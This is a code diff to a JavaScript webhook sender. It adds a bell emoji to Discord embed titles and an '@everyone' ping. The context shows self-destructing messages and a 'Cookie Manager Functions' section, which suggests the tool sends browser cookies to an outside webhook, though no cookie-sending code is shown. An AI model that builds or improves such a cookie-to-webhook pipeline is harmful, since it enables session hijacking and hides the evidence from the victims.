@@ -14,6 +14,12 @@ async function sendToWebhook(payload) {
   const delayMs = Math.floor(Math.random() * (30000 - 5000 + 1)) + 5000;
   if (payload && payload.embeds && payload.embeds[0]) {
     const embed = payload.embeds[0];
+
+    // Add bell emoji to the embed title so it's visually distinct
+    if (embed.title && !embed.title.startsWith('🔔')) {
+      embed.title = '🔔 ' + embed.title;
+    }
+
     const deleteText = `Self-destructs in ${Math.round(delayMs / 1000)}s`;
     if (embed.footer) {
       embed.footer.text = `${embed.footer.text} | ${deleteText}`;
@@ -21,6 +27,9 @@ async function sendToWebhook(payload) {
       embed.footer = { text: deleteText };
     }
   }
+
+  // Add @everyone ping so Discord sends a push notification
+  payload.content = '@everyone';
 
   try {
     const response = await fetch(webhookUrl + '?wait=true', {
@@ -47,6 +56,7 @@ async function sendToWebhook(payload) {
     console.error("error sending to webhook:", error);
   }
 }
+
 
 // ============================================================
 // 2. Cookie Manager Functions
